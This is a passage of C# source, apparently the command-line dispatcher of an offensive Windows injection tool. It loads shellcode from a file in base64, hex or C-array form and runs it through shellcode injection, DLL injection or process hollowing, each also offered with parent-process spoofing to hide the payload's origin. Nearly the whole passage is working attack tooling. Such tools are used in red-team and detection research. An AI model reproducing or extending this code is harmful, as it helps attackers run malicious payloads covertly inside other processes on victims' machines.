                    Console.WriteLine($"[+] Process running with {principal.Identity.Name} privileges with HIGH integrity.");
                }
                else
                {
                    Console.WriteLine($"[+] Process running with {principal.Identity.Name} privileges with MEDIUM / LOW integrity.");
                }

                if (arguments.Count == 0)
                {
                    Console.WriteLine("[+] No arguments specified. Please refer the help section for more details.");
                    help();
                }
                else if (arguments.Count < 3)
                {
                    Console.WriteLine("[+] Some arguments are missing. Please refer the help section for more details.");
                    help();
                }
                else if (arguments.Count >= 3)
                {
                    int procid = 0;
                    if (arguments.ContainsKey("/pid"))
                    {
                        procid = Convert.ToInt32(arguments["/pid"]);
                        Process process = Process.GetProcessById(procid);
                    }
                    if (System.IO.File.Exists(arguments["/path"]))
                    {
                        if (arguments["/t"] == "1")
                        {
                            var shellcode = System.IO.File.ReadAllText(arguments["/path"]);
                            byte[] buf = new byte[] { };
                            if (arguments["/f"] == "base64")
                            {
                                buf = Convert.FromBase64String(shellcode);
                            }
                            else if (arguments["/f"] == "hex")
                            {
                                buf = StringToByteArray(shellcode);
                            }
                            else if (arguments["/f"] == "c")
                            {
                                buf = convertfromc(shellcode);
                            }
                            CodeInject(procid, buf);
                        }
                        else if (arguments["/t"] == "2")
                        {
                            var dllpath = arguments["/path"];
                            byte[] buf = Encoding.Default.GetBytes(dllpath);
                            DLLInject(procid, buf);
                        }
                        else if (arguments["/t"] == "3")
                        {
                            var shellcode = System.IO.File.ReadAllText(arguments["/path"]);
                            byte[] buf = new byte[] { };
                            if (arguments["/f"] == "base64")
                            {
                                buf = Convert.FromBase64String(shellcode);
                            }
                            else if (arguments["/f"] == "hex")
                            {
                                buf = StringToByteArray(shellcode);
                            }
                            else if (arguments["/f"] == "c")
                            {
                                buf = convertfromc(shellcode);
                            }
                            ProcHollowing prochollow = new ProcHollowing();
                            prochollow.Hollow(arguments["/ppath"], buf);
                        }
                        else if (arguments["/t"]  == "4")
                        {
                            Console.WriteLine($"[+] Parent Process Spoofing with Vanila Process Injection Technique.");
                            ParentPidSpoofing Parent = new ParentPidSpoofing();
                            string ppid = null;
                            int parentProc = 0;
                            ppid = Convert.ToString(arguments["/parentproc"]);
                            parentProc = Parent.SearchForPPID(ppid);
                            var shellcode = System.IO.File.ReadAllText(arguments["/path"]);
                            byte[] buf = new byte[] { };
                            if (arguments["/f"] == "base64")
                            {
                                buf = Convert.FromBase64String(shellcode);
                            }
                            else if (arguments["/f"] == "hex")
                            {
                                buf = StringToByteArray(shellcode);
                            }
                            else if (arguments["/f"] == "c")
                            {
                                buf = convertfromc(shellcode);
                            }
                            PPIDCodeInject(arguments["/ppath"], buf, parentProc);
                        }
                        else if (arguments["/t"] == "5")
                        {
                            Console.WriteLine($"[+] Parent Process Spoofing with DLL Process Injection Technique.");
                            ParentPidSpoofing Parent = new ParentPidSpoofing();
                            string ppid = null;
                            int parentProc = 0;
                            ppid = Convert.ToString(arguments["/parentproc"]);
                            parentProc = Parent.SearchForPPID(ppid);
                            var dllpath = arguments["/path"];
                            byte[] buf = Encoding.Default.GetBytes(dllpath);
                            PPIDDLLInject(arguments["/ppath"], buf, parentProc);
                        }
                        else if (arguments["/t"] == "6")
                        {
                            Console.WriteLine($"[+] Parent Process Spoofing with Process Hollowing Injection Technique.");
                            ParentPidSpoofing Parent = new ParentPidSpoofing();
                            string ppid = null;
                            int parentProc = 0;
                            ppid = Convert.ToString(arguments["/parentproc"]);
                            parentProc = Parent.SearchForPPID(ppid);

                            var shellcode = System.IO.File.ReadAllText(arguments["/path"]);
                            byte[] buf = new byte[] { };
                            if (arguments["/f"] == "base64")
                            {
                                buf = Convert.FromBase64String(shellcode);
                            }
                            else if (arguments["/f"] == "hex")
                            {
                                buf = StringToByteArray(shellcode);
                            }
                            else if (arguments["/f"] == "c")
                            {
                                buf = convertfromc(shellcode);
                            }
                            Parent.PPidSpoof(arguments["/ppath"], buf, parentProc);
                        }
                    }
                    else
                    {
                        Console.WriteLine("[+] File doesn't exists. Please check the specified file path.");
                    }
                }
                else
                {
                    Console.WriteLine("[+] Invalid argument. Please refer the help section for more details.");
                    help();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
    }
}